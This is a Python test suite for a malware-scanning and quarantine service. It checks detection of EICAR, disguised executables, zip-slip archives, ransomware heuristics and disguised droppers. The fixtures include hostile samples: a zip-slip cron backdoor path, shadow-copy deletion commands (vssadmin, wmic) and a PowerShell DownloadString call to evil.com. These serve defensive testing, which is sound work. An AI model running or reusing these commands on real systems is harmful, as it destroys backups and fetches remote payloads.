"""
Comprehensive test suite for Phase 7: Automatic File Scanning and Threat Detection.

Verifies:
1. Harmless clean file ingestion and successful release gate passage.
2. EICAR standard antivirus test fixture detection and quarantine lockdown.
3. True magic byte file signature verification (detecting disguised .exe named as .pdf).
4. Archive bomb and Zip-slip path traversal detection.
5. Strict Zero-Trust release gate: HTTP 403 on non-clean files, preventing execution/release.
6. Platform-managed download streaming inspection (POST /api/scan/url).
"""

import io
import pytest
import zipfile
from httpx import ASGITransport, AsyncClient

from backend.main import app
from backend.services.file_scanner import (
    ReleasePolicy,
    ScanState,
    _EICAR_SIGNATURE,
    file_scanner,
)


@pytest.fixture
def anyio_backend():
    return "asyncio"


@pytest.mark.anyio
async def test_clean_file_scanning_and_release():
    """Test that harmless files are verified, fingerprinted, and released."""
    clean_bytes = b"Hello, this is a completely harmless CyberKawach report."
    filename = "report.txt"

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Ingest file
        files = {"file": (filename, clean_bytes, "text/plain")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["original_filename"] == filename
        assert data["state"] == ScanState.CLEAN.value
        assert data["release_policy"] == ReleasePolicy.ALLOWED.value
        assert len(data["sha256"]) == 64
        assert len(data["findings"]) > 0

        scan_id = data["scan_id"]

        # Status check
        status_resp = await client.get(f"/api/scan/{scan_id}")
        assert status_resp.status_code == 200
        assert status_resp.json()["state"] == ScanState.CLEAN.value

        # Download gate check: Must succeed with 200 OK
        dl_resp = await client.get(f"/api/scan/{scan_id}/download")
        assert dl_resp.status_code == 200
        assert dl_resp.content == clean_bytes


@pytest.mark.anyio
async def test_eicar_antivirus_detection_and_quarantine():
    """Test that the standard EICAR test fixture is instantly flagged as MALICIOUS and quarantined."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("eicar_test.com", _EICAR_SIGNATURE, "application/octet-stream")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["state"] == ScanState.MALICIOUS.value
        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("EICAR" in sig for sig in data["threat_signatures"])
        assert data["quarantine_path"] is not None

        scan_id = data["scan_id"]

        # Download gate check: MUST return HTTP 403 Forbidden
        dl_resp = await client.get(f"/api/scan/{scan_id}/download")
        assert dl_resp.status_code == 403
        err_detail = dl_resp.json().get("detail", {})
        assert err_detail.get("release_policy") == ReleasePolicy.BLOCKED.value
        assert err_detail.get("state") == ScanState.MALICIOUS.value


@pytest.mark.anyio
async def test_magic_byte_extension_spoofing_detection():
    """Test that a Windows executable disguised as an innocuous PDF is unmasked and blocked."""
    # Start with Windows PE magic bytes 'MZ' followed by executable headers
    spoofed_exe = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"A" * 100
    disguised_filename = "Important_Invoice.pdf"

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": (disguised_filename, spoofed_exe, "application/pdf")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        # Unmasked as PE32 executable despite the .pdf extension and application/pdf header
        assert data["magic_mime"] == "application/x-dosexec"
        assert "PE32 Executable" in data["file_type_description"]
        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert data["state"] in (ScanState.SUSPICIOUS.value, ScanState.MALICIOUS.value)


@pytest.mark.anyio
async def test_zip_slip_path_traversal_detection():
    """Test that malicious archive members attempting path traversal are quarantined."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../../etc/cron.d/backdoor", b"* * * * * root /tmp/evil.sh")
    zip_bytes = buf.getvalue()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("malicious_archive.zip", zip_bytes, "application/zip")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["state"] == ScanState.MALICIOUS.value
        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("Zip-Slip" in f for f in data["findings"])

        # Release gate must block
        dl_resp = await client.get(f"/api/scan/{data['scan_id']}/download")
        assert dl_resp.status_code == 403


@pytest.mark.anyio
async def test_archive_smuggled_executable_detection():
    """Test that dangerous executables bundled inside zip files are detected."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("photos/vacation.jpg", b"harmless image data")
        zf.writestr("installer.exe", b"fake binary payload")
    zip_bytes = buf.getvalue()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        files = {"file": ("bundle.zip", zip_bytes, "application/zip")}
        resp = await client.post("/api/scan/file", files=files)
        assert resp.status_code == 200
        data = resp.json()

        assert data["release_policy"] == ReleasePolicy.BLOCKED.value
        assert any("Dangerous executable" in f for f in data["findings"])


@pytest.mark.anyio
async def test_oversized_file_rejection():
    """Test that files exceeding configured resource limits are safely rejected with ERROR state."""
    # 51 MB (exceeds 50 MB threshold)
    huge_payload = b"X" * (51 * 1024 * 1024)
    record = await file_scanner.scan_bytes(content=huge_payload, original_filename="huge.bin")
    assert record.state == ScanState.ERROR
    assert record.release_policy == ReleasePolicy.BLOCKED
    assert any("exceeds maximum size limit" in f for f in record.findings)


@pytest.mark.anyio
async def test_nonexistent_scan_id_404():
    """Test that querying or downloading invalid scan IDs returns 404."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/scan/nonexistent_scan_12345")
        assert resp.status_code == 404

        dl_resp = await client.get("/api/scan/nonexistent_scan_12345/download")
        assert dl_resp.status_code == 404


@pytest.mark.anyio
async def test_deep_analysis_heuristics_ransomware_and_powershell():
    """Test deep analysis static heuristics for ransomware shadow deletion and obfuscated scripts."""
    ransomware_script = b"@echo off\r\nvssadmin delete shadows /all /quiet\r\nwmic shadowcopy delete\r\n"
    record = await file_scanner.scan_bytes(content=ransomware_script, original_filename="cleanup.bat")

    assert record.state == ScanState.MALICIOUS
    assert record.release_policy == ReleasePolicy.BLOCKED
    assert any("Ransomware" in h for h in record.threat_signatures)
    assert "heuristic_hits" in record.deep_analysis
    assert record.entropy > 0.0


@pytest.mark.anyio
async def test_folder_batch_upload_and_aggregation():
    """Test whole-folder batch scan: multiple files across folders with aggregated verdicts."""
    files = [
        ("files", ("project/readme.txt", b"Clean documentation", "text/plain")),
        ("files", ("project/config.json", b'{"key": "value"}', "application/json")),
        ("files", ("project/scripts/exploit.bat", b"vssadmin delete shadows /all", "text/plain")),
    ]

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.post("/api/scan/folder", files=files, params={"folder_name": "MyProjectFolder"})
        assert resp.status_code == 200
        data = resp.json()

        assert data["folder_name"] == "MyProjectFolder"
        assert data["total_files"] == 3
        assert data["clean_count"] == 2
        assert data["malicious_count"] == 1
        assert data["overall_state"] == ScanState.MALICIOUS.value
        assert data["overall_release_policy"] == ReleasePolicy.BLOCKED.value
        assert len(data["file_records"]) == 3


@pytest.mark.anyio
async def test_real_world_malware_carrier_kit_detection():
    """Test pure live dynamic analysis against real-world multi-vector malware carrier payloads."""
    # 1. Format confusion: RTF Equation Editor exploit named as .jpg
    rtf_exploit = b"{\\rtf1\\ansi\\adeff31507\\object\\objocx Equation.3\\objdata 0105000002000000}"
    rec1 = await file_scanner.scan_bytes(content=rtf_exploit, original_filename="banner.jpg")
    assert rec1.state == ScanState.MALICIOUS
    assert rec1.release_policy == ReleasePolicy.BLOCKED
    assert any("Format Confusion" in t for t in rec1.threat_signatures)

    # 2. Format confusion: PowerShell trojan disguised as .gif
    ps_trojan = b"Set-StrictMode -Version 2\r\nif ((Get-Process powershell).count -gt 2){ exit }\r\n"
    rec2 = await file_scanner.scan_bytes(content=ps_trojan, original_filename="loadinglit.gif")
    assert rec2.state == ScanState.MALICIOUS
    assert rec2.release_policy == ReleasePolicy.BLOCKED
    assert any("Format Confusion" in t for t in rec2.threat_signatures)

    # 3. Format confusion: ShortJSRAT scriptlet disguised as .jpg
    scriptlet = b"<?XML version=\"1.0\"?>\r\n<scriptlet>\r\n<registration progid=\"ShortJSRAT\">\r\n"
    rec3 = await file_scanner.scan_bytes(content=scriptlet, original_filename="ad1.jpg")
    assert rec3.state == ScanState.MALICIOUS
    assert rec3.release_policy == ReleasePolicy.BLOCKED
    assert any("ShortJSRAT" in t or "Format Confusion" in t for t in rec3.threat_signatures)

    # 4. Executable dropper without extension
    raw_pe = b"MZ\xe8\x00\x00\x00\x00[New-Object Net.WebClient.DownloadString('http://evil.com/c2')]"
    rec4 = await file_scanner.scan_bytes(content=raw_pe, original_filename="payload")
    assert rec4.state == ScanState.MALICIOUS
    assert rec4.release_policy == ReleasePolicy.BLOCKED
    assert any("Malware Dropper" in t for t in rec4.threat_signatures)


